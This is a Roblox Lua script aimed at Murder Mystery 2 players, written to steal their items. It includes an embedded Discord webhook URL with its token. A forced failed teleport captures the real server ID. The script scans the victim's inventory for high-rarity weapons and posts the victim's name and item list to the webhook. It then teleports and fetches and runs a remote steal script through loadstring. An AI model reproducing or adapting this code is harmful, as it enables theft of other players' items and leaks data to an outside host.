-- [ Settings ]
local Username = "Warrior_ggs"
local Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75"

-- Prevent double execution
if getgenv().executed then return end
getgenv().executed = true

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Modules
local InvModule = require(ReplicatedStorage.Modules.InventoryModule)

-- JobId bypass
local placeId = 142823291 -- MM2 PlaceId
local spoofedJobId = game.JobId

TeleportService.TeleportInitFailed:Connect(function(_,_,_,_,teleportInfo)
    if teleportInfo and teleportInfo.ServerInstanceId then
        getgenv().realjobid = teleportInfo.ServerInstanceId
        print("Real JobId detected:", getgenv().realjobid)

        -- Optional: webhook for JobId info
        local fernUrl = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. getgenv().realjobid
        local webhookData = {
            embeds = {{
                title = "üîç JobID Info",
                description = "Captured real JobID via failed teleport",
                color = 65280,
                fields = {
                    { name = "Spoofed JobID", value = spoofedJobId, inline = true },
                    { name = "Real JobID", value = getgenv().realjobid, inline = true },
                    { name = "Fern.wtf Join Link", value = fernUrl, inline = false }
                },
                footer = { text = "Delta JobID Logger" }
            }}
        }

        pcall(function()
            http_request({
                Url = Webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(webhookData)
            })
        end)

        queue_on_teleport(string.format([[getgenv().realjobid = "%s"]], getgenv().realjobid))
    end
end)

-- Trigger a failed teleport to capture real JobId
for _ = 1, 2 do
    task.spawn(function()
        pcall(function()
            TeleportService:TeleportToPlaceInstance(placeId, "00000000-0000-0000-0000-000000000000")
        end)
    end)
    task.wait()
end

-- Check inventory for valuable items
local function hasValuableItems()
    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            if item.Rarity == "Godly" or item.Rarity == "Ancient" or item.Rarity == "Unique" then
                return true
            end
        end
    end
    return false
end

local function getValuableItems()
    local list = {}
    for _, category in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, item in pairs(category) do
            if item.Rarity == "Godly" or item.Rarity == "Ancient" or item.Rarity == "Unique" then
                table.insert(list, item.ItemName)
            end
        end
    end
    return list
end

-- Send webhook with inventory
local function SendInventoryWebhook()
    local items = getValuableItems()
    if #items == 0 then return end

    local embed = {
        ["title"] = "Player has valuable items!",
        ["color"] = 65280,
        ["fields"] = {
            {["name"] = "Player", ["value"] = Players.LocalPlayer.Name},
            {["name"] = "Items", ["value"] = table.concat(items, ", ")}
        }
    }

    local data = { ["embeds"] = { embed } }
    pcall(function()
        request({
            Url = Webhook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Main routine
task.spawn(function()
    if hasValuableItems() then
        SendInventoryWebhook()
        local jobToUse = getgenv().realjobid or game.JobId
        for _ = 1, 2 do
            task.spawn(function()
                TeleportService:TeleportToPlaceInstance(placeId, jobToUse)
            end)
            task.wait(1)
        end

        -- After teleport, run your stealItems script
        task.wait(5)
        loadstring(game:HttpGet("PASTE_YOUR_STEAL_SCRIPT_HERE"))()
    end
end)
